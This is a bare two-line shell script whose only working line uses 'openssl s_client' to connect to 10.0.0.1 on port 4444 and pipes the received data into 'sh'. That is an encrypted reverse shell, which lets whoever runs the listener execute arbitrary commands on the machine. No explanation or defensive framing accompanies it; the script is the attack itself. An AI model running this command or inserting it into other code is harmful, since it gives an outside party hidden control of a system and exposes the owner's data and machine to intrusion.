#!/bin/sh
openssl s_client -connect 10.0.0.1:4444 -quiet | sh
